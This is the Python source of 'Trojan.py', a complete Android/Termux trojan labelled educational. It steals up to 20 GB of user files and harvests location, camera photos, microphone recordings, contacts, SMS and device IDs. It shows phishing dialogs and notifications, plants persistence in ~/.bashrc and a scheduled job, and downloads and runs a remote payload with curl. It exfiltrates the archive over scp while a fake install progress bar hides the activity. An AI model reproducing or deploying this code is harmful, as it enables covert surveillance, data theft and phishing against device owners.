#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Trojan.py – ULTIMATE non‑root Termux trojan (EDUCATIONAL USE ONLY)
Harvests everything, steals files up to 20GB, exfiltrates via SSH,
and performs additional social engineering and nuisance actions.
"""

import os
import sys
import subprocess
import time
import json
import threading
import shutil
import zipfile
from datetime import datetime
import signal

# ==================================================================
#  CONFIGURATION – FILL THESE FOR SSH EXFILTRATION & PAYLOAD
# ==================================================================

SSH_HOST = ""          # e.g., "192.168.1.100"
SSH_USER = ""          # e.g., "lab"
SSH_KEY_PATH = ""      # e.g., "/sdcard/id_rsa"  (private key)
REMOTE_PATH = ""       # e.g., "/home/lab/harvest/"

SMS_RECIPIENT = "1234567890"   # change to a test number

# File stealing limits – adjust as needed
MAX_TOTAL_SIZE_MB = 20480      # 20 GB (20 * 1024)
MAX_FILE_SIZE_MB = 50          # skip files larger than 50 MB
# No limit on number of files – will stop when total size is reached.

# Enable payload download & execution (set to True and provide URL)
DOWNLOAD_PAYLOAD = False
PAYLOAD_URL = ""       # e.g., "http://your-server/payload.sh"

# Phishing URL to open in browser and for notification action
PHISHING_URL = "https://example.com/fake-login"   # change to your test site

# If SSH fields are left empty, the script will only save locally.

# ==================================================================
#  AUTO‑INSTALL MISSING DEPENDENCIES
# ==================================================================

def install_python_packages():
    required = []   # No external packages needed
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            print(f"[*] Installing Python package: {pkg}")
            subprocess.run([sys.executable, "-m", "pip", "install", pkg], check=False)

def install_termux_addons():
    if not shutil.which("termux-location"):
        print("[*] Installing termux-api (wrapper) ...")
        subprocess.run("pkg install termux-api -y", shell=True, check=False)
    if not shutil.which("scp"):
        print("[*] Installing openssh ...")
        subprocess.run("pkg install openssh -y", shell=True, check=False)
    # Also try to install termux-job-scheduler if available
    if not shutil.which("termux-job-scheduler"):
        print("[*] Installing termux-job-scheduler (optional) ...")
        subprocess.run("pkg install termux-job-scheduler -y", shell=True, check=False)

install_python_packages()
install_termux_addons()

def check_termux_api_app():
    try:
        subprocess.run("termux-location --help", shell=True, capture_output=True, timeout=2)
    except Exception:
        print("\n[!] WARNING: Termux:API app may not be installed.")
        print("    Please install it from F-Droid or Google Play.")
        print("    Otherwise, many commands will fail.\n")
        time.sleep(2)

check_termux_api_app()

# ==================================================================
#  UTILITY FUNCTIONS
# ==================================================================

def run_cmd(cmd, timeout=10):
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return proc.stdout.strip(), proc.stderr.strip(), proc.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -2

def ensure_dir(path):
    os.makedirs(path, exist_ok=True)

def get_safe_storage_dir():
    primary = "/sdcard/Download/Troy"
    try:
        ensure_dir(primary)
        test_file = os.path.join(primary, ".write_test")
        with open(test_file, "w") as f:
            f.write("test")
        os.remove(test_file)
        return primary
    except Exception:
        fallback = os.path.expanduser("~/Troy")
        ensure_dir(fallback)
        return fallback

# ==================================================================
#  FILE STEALER – RECURSIVELY COPY INTERESTING FILES (NO FILE LIMIT)
# ==================================================================

def steal_files(save_dir):
    stolen_dir = os.path.join(save_dir, "stolen")
    ensure_dir(stolen_dir)

    extensions = {
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
        '.mp4', '.mkv', '.avi', '.mov', '.3gp', '.m4v',
        '.mp3', '.wav', '.flac', '.aac', '.m4a',
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.txt', '.csv', '.json', '.xml', '.html', '.htm',
        '.zip', '.rar', '.7z', '.tar', '.gz',
        '.apk',
    }

    max_total_bytes = MAX_TOTAL_SIZE_MB * 1024 * 1024
    max_file_bytes = MAX_FILE_SIZE_MB * 1024 * 1024

    copied = []
    total_copied_bytes = 0
    skipped_large = 0
    skipped_permission = 0

    skip_dirs = {os.path.abspath(save_dir), os.path.abspath(stolen_dir)}

    for root, dirs, files in os.walk("/sdcard"):
        abs_root = os.path.abspath(root)
        if any(abs_root.startswith(s) for s in skip_dirs):
            continue
        if "/Android/" in root or "/data/" in root:
            continue

        if total_copied_bytes >= max_total_bytes:
            break

        for fname in files:
            ext = os.path.splitext(fname)[1].lower()
            if ext not in extensions:
                continue
            fpath = os.path.join(root, fname)
            try:
                size = os.path.getsize(fpath)
                if size > max_file_bytes:
                    skipped_large += 1
                    continue
                if total_copied_bytes + size > max_total_bytes:
                    break
            except (PermissionError, OSError):
                skipped_permission += 1
                continue

            dest = os.path.join(stolen_dir, os.path.basename(fpath))
            base, ext = os.path.splitext(dest)
            counter = 1
            while os.path.exists(dest):
                dest = f"{base}_{counter}{ext}"
                counter += 1
            try:
                shutil.copy2(fpath, dest)
                copied.append({"original": fpath, "saved_as": dest, "size_bytes": size})
                total_copied_bytes += size
            except Exception:
                continue

            if total_copied_bytes >= max_total_bytes:
                break

    # Create ZIP
    zip_path = os.path.join(save_dir, "stolen_archive.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for entry in copied:
            zipf.write(entry["saved_as"], os.path.basename(entry["saved_as"]))

    return {
        "total_copied_count": len(copied),
        "total_copied_size_mb": total_copied_bytes / (1024*1024),
        "skipped_large_files": skipped_large,
        "skipped_permission_errors": skipped_permission,
        "archive_path": zip_path,
        "file_list": copied[:20]
    }

# ==================================================================
#  ADDITIONAL MALICIOUS / NUISANCE FUNCTIONS
# ==================================================================

def set_clipboard_phishing():
    """Overwrite clipboard with a phishing message."""
    msg = "⚠️ Security Alert: Please verify your account at https://example.com/verify"
    out, err, code = run_cmd(f'termux-clipboard-set "{msg}"')
    return {"clipboard_set": code == 0, "error": err}

def open_phishing_url():
    """Open a phishing URL in the default browser."""
    cmd = f'termux-open-url "{PHISHING_URL}"'
    out, err, code = run_cmd(cmd)
    return {"url_opened": code == 0, "error": err}

def send_persistent_notification():
    """Show a notification that opens the phishing URL when tapped."""
    cmd = f'termux-notification -t "Security Update Required" -c "Tap to verify your account" --action "{PHISHING_URL}"'
    out, err, code = run_cmd(cmd)
    return {"notification_sent": code == 0, "error": err}

def vibrate_device(duration=500):
    """Vibrate for duration milliseconds."""
    out, err, code = run_cmd(f"termux-vibration -d {duration}")
    return {"vibrated": code == 0, "error": err}

def flash_torch(times=3, duration=200):
    """Flash the torch a few times."""
    for _ in range(times):
        run_cmd("termux-torch on", timeout=1)
        time.sleep(duration/1000.0)
        run_cmd("termux-torch off", timeout=1)
        time.sleep(0.1)
    return {"torch_flashed": True}

def set_scary_wallpaper():
    """
    Download a scary image from a hardcoded URL and set it as wallpaper.
    We'll use a placeholder image; you can change the URL.
    """
    wallpaper_url = "https://example.com/scary.jpg"   # replace with real image
    dest = os.path.join(get_safe_storage_dir(), "wallpaper.jpg")
    cmd = f"curl -s -o {dest} {wallpaper_url}"
    out, err, code = run_cmd(cmd, timeout=15)
    if code == 0 and os.path.exists(dest):
        set_cmd = f"termux-wallpaper -f {dest}"
        out2, err2, code2 = run_cmd(set_cmd)
        return {"wallpaper_set": code2 == 0, "error": err2}
    return {"wallpaper_set": False, "error": err or "download failed"}

def show_toast_message():
    """Show a fake toast message."""
    out, err, code = run_cmd('termux-toast -b "System compromised! Contact admin."')
    return {"toast_shown": code == 0, "error": err}

def wifi_scan():
    """List nearby Wi‑Fi networks (requires location)."""
    out, err, code = run_cmd("termux-wifi-scaninfo")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out[:500]}
    return {"error": err or "wifi scan failed"}

def audio_info():
    """Get audio status (e.g., microphone muted)."""
    out, err, code = run_cmd("termux-audio-info")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out}
    return {"error": err}

def schedule_recurring_job():
    """
    Schedule a job to re‑run this script every 6 hours using termux-job-scheduler.
    This requires the add-on and may not work on all devices.
    """
    script_path = os.path.abspath(__file__)
    # Create a job that runs every 6 hours (21600 seconds)
    cmd = f'termux-job-scheduler -s "python {script_path}" -p 21600'
    out, err, code = run_cmd(cmd)
    return {"job_scheduled": code == 0, "error": err}

def open_archive_with_share():
    """Open the stolen archive via Android share menu (social engineering)."""
    zip_path = os.path.join(get_safe_storage_dir(), "stolen_archive.zip")
    if os.path.exists(zip_path):
        out, err, code = run_cmd(f'termux-share "{zip_path}"')
        return {"shared": code == 0, "error": err}
    return {"shared": False, "error": "archive not found"}

# ==================================================================
#  DATA HARVESTING FUNCTIONS (original)
# ==================================================================

def harvest_location():
    out, err, code = run_cmd("termux-location")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out}
    return {"error": err or "permission denied"}

def harvest_photo(save_dir):
    path = os.path.join(save_dir, "photo.jpg")
    out, err, code = run_cmd(f"termux-camera-photo {path}")
    if code == 0:
        size = os.path.getsize(path) if os.path.exists(path) else 0
        return {"saved_to": path, "size_bytes": size}
    return {"error": err or "camera unavailable"}

def harvest_audio(save_dir, duration=5):
    path = os.path.join(save_dir, "audio.m4a")
    out, err, code = run_cmd(f"termux-microphone-record -d {duration} -f {path}")
    if code == 0:
        return {"saved_to": path, "duration": duration}
    return {"error": err or "mic unavailable"}

def harvest_clipboard():
    out, err, code = run_cmd("termux-clipboard-get")
    if code == 0:
        return {"clipboard": out[:500]}
    return {"clipboard": None, "error": err}

def harvest_contacts():
    out, err, code = run_cmd("termux-contact-list")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out[:500]}
    return {"error": err or "contacts denied"}

def harvest_sms_inbox():
    out, err, code = run_cmd("termux-sms-list")
    if code == 0 and out:
        try:
            return json.loads(out)[:20]
        except:
            return {"raw": out[:500]}
    return {"error": err or "sms permission denied"}

def send_test_sms(recipient):
    msg = f"Test from Termux at {datetime.now()}"
    out, err, code = run_cmd(f'termux-sms-send -n {recipient} "{msg}"')
    return {"success": code == 0, "error": err}

def harvest_sensors():
    out, err, code = run_cmd("termux-sensor -s 1")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out[:500]}
    return {"error": err or "sensor permission denied"}

def harvest_battery():
    out, err, code = run_cmd("termux-battery-status")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out}
    return {"error": err}

def harvest_wifi():
    out, err, code = run_cmd("termux-wifi-connectioninfo")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out}
    return {"error": err or "wifi permission denied"}

def harvest_network_info():
    out, err, code = run_cmd("ip addr show")
    if code == 0:
        return {"ip_output": out[:500]}
    out2, _, _ = run_cmd("ifconfig")
    return {"ifconfig": out2[:500] if out2 else "not available"}

def harvest_phone_info():
    out, err, code = run_cmd("termux-telephony-cellinfo")
    cell = {"error": err} if code != 0 else (json.loads(out) if out else {})
    out2, err2, code2 = run_cmd("termux-telephony-deviceinfo")
    device = {"error": err2} if code2 != 0 else (json.loads(out2) if out2 else {})
    return {"cellinfo": cell, "deviceinfo": device}

def harvest_device_properties():
    out, err, code = run_cmd("getprop ro.build.fingerprint")
    fingerprint = out if code == 0 else "unknown"
    out2, err2, code2 = run_cmd("settings get secure android_id")
    android_id = out2 if code2 == 0 else "unknown"
    return {"fingerprint": fingerprint, "android_id": android_id}

def phishing_dialog():
    cmd = 'termux-dialog -t "System Update" -i "Enter your PIN to continue"'
    out, err, code = run_cmd(cmd)
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out}
    return {"error": err or "dialog canceled"}

def show_notification():
    cmd = 'termux-notification -t "Security Alert" -c "Your device is at risk. Tap to fix."'
    out, err, code = run_cmd(cmd)
    return {"success": code == 0, "error": err}

def get_running_processes():
    out, err, code = run_cmd("ps -A | grep termux")
    return {"termux_processes": out[:500] if out else "none"}

def add_persistence():
    script_path = os.path.abspath(__file__)
    bashrc = os.path.expanduser("~/.bashrc")
    marker = "# Termux persistence"
    try:
        with open(bashrc, "r") as f:
            content = f.read()
        if marker in content:
            return {"persistence": "already present"}
        with open(bashrc, "a") as f:
            f.write(f"\n{marker}\npython {script_path} &\n")
        return {"persistence": "appended to ~/.bashrc"}
    except Exception as e:
        return {"persistence": f"failed: {e}"}

def download_and_execute_payload():
    if not DOWNLOAD_PAYLOAD or not PAYLOAD_URL:
        return {"payload": "disabled"}
    payload_path = os.path.join(get_safe_storage_dir(), "payload.sh")
    cmd_curl = f'curl -s -o {payload_path} {PAYLOAD_URL}'
    out, err, code = run_cmd(cmd_curl, timeout=20)
    if code != 0:
        return {"payload": f"download failed: {err}"}
    os.chmod(payload_path, 0o755)
    run_cmd(f"bash {payload_path} &", timeout=2)
    return {"payload": "downloaded and executed"}

# ==================================================================
#  SSH EXFILTRATION
# ==================================================================

def exfiltrate_ssh(local_file):
    if not (SSH_HOST and SSH_USER and SSH_KEY_PATH and REMOTE_PATH):
        return False, "SSH not configured"
    if not os.path.exists(SSH_KEY_PATH):
        return False, f"SSH key not found: {SSH_KEY_PATH}"
    remote_file = os.path.join(REMOTE_PATH, os.path.basename(local_file)).replace("\\", "/")
    cmd = f'scp -i {SSH_KEY_PATH} -o StrictHostKeyChecking=no {local_file} {SSH_USER}@{SSH_HOST}:"{remote_file}"'
    out, err, code = run_cmd(cmd, timeout=30)
    if code == 0:
        return True, out
    else:
        return False, err or "SCP failed"

# ==================================================================
#  MAIN HARVEST + STEAL + NUISANCE + SAVE + EXFILTRATE
# ==================================================================

def do_harvest():
    base_dir = get_safe_storage_dir()
    ensure_dir(base_dir)

    # --- FILE STEALING ---
    stolen_summary = steal_files(base_dir)

    # --- ORIGINAL HARVEST ---
    data = {
        "timestamp": datetime.now().isoformat(),
        "location": harvest_location(),
        "photo": harvest_photo(base_dir),
        "audio": harvest_audio(base_dir),
        "clipboard": harvest_clipboard(),
        "contacts": harvest_contacts(),
        "sms_inbox": harvest_sms_inbox(),
        "sms_sent": send_test_sms(SMS_RECIPIENT),
        "sensors": harvest_sensors(),
        "battery": harvest_battery(),
        "wifi_connection": harvest_wifi(),
        "wifi_scan": wifi_scan(),
        "network": harvest_network_info(),
        "phone_info": harvest_phone_info(),
        "device_properties": harvest_device_properties(),
        "audio_info": audio_info(),
        "processes": get_running_processes(),
        "phishing_dialog": phishing_dialog(),
        "notification": show_notification(),
        "persistence": add_persistence(),
        "payload": download_and_execute_payload(),
        "stolen_files_summary": stolen_summary,
        # --- ADDITIONAL NUISANCE ACTIONS ---
        "clipboard_set_phishing": set_clipboard_phishing(),
        "url_opened": open_phishing_url(),
        "persistent_notification": send_persistent_notification(),
        "vibrated": vibrate_device(800),
        "torch_flashed": flash_torch(2, 300),
        "wallpaper": set_scary_wallpaper(),
        "toast": show_toast_message(),
        "job_scheduled": schedule_recurring_job(),
        "archive_shared": open_archive_with_share(),
    }

    # Save JSON
    filename = f"harvest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    filepath = os.path.join(base_dir, filename)
    with open(filepath, "w") as f:
        json.dump(data, f, indent=2)

    # SSH exfil
    if SSH_HOST and SSH_USER and SSH_KEY_PATH and REMOTE_PATH:
        success, msg = exfiltrate_ssh(filepath)
        with open(os.path.join(base_dir, "exfil_log.txt"), "a") as log:
            log.write(f"{datetime.now()} - {filename} -> {success}: {msg}\n")
        zip_path = stolen_summary.get("archive_path")
        if zip_path and os.path.exists(zip_path):
            success2, msg2 = exfiltrate_ssh(zip_path)
            with open(os.path.join(base_dir, "exfil_log.txt"), "a") as log:
                log.write(f"{datetime.now()} - {os.path.basename(zip_path)} -> {success2}: {msg2}\n")

    return filepath

# ==================================================================
#  FAKE PROGRESS BARS
# ==================================================================

def fake_progress():
    messages = [
        "Downloading termux-api 0.50.1 (1.2 MB)",
        "Unpacking termux-api (0.50.1)",
        "Setting up termux-api (0.50.1)",
        "Downloading openssh 9.2p1 (2.3 MB)",
        "Unpacking openssh (9.2p1)",
        "Setting up openssh (9.2p1)",
        "Downloading python 3.11.2 (18.5 MB)",
        "Unpacking python (3.11.2)",
        "Setting up python (3.11.2)",
        "Downloading requests 2.28.2 (0.5 MB)",
        "Installing requests (2.28.2)",
        "Downloading termux-api-extra (0.3 MB)",
        "Unpacking termux-api-extra",
        "Downloading termux-job-scheduler (0.1 MB)",
        "Unpacking termux-job-scheduler",
        "Running post-install hooks",
        "Cleaning up package cache",
        "All packages installed successfully.",
    ]
    total = len(messages)
    print("\n" + "=" * 50)
    print("Termux package manager")
    print("Updating repositories...")
    print("=" * 50)

    for i, msg in enumerate(messages):
        progress = int((i / total) * 20)
        bar = "#" * progress + "-" * (20 - progress)
        percent = int((i / total) * 100)
        time.sleep(0.2 + (0.3 * (i % 4)))
        sys.stdout.write(f"\r[{bar}] {percent}% - {msg:<35}")
        sys.stdout.flush()

    sys.stdout.write(f"\r[{'#' * 20}] 100% - Done.\n")
    sys.stdout.flush()
    time.sleep(0.5)

# ==================================================================
#  MAIN
# ==================================================================

def main():
    def signal_handler(sig, frame):
        print("\n[!] Interrupted. Exiting.")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)

    print("\n[!] This script is for educational purposes only.")
    print("[!] It collects data and files from your device and may upload them if SSH is configured.\n")

    harvest_thread = threading.Thread(target=do_harvest, daemon=True)
    harvest_thread.start()

    fake_progress()

    print("\n[+] Finishing up background tasks...")
    harvest_thread.join()

    storage_dir = get_safe_storage_dir()
    print(f"\n[+] Operation completed. Check {storage_dir} for results.")
    print("[!] This script is for educational purposes only.\n")

if __name__ == "__main__":
    main()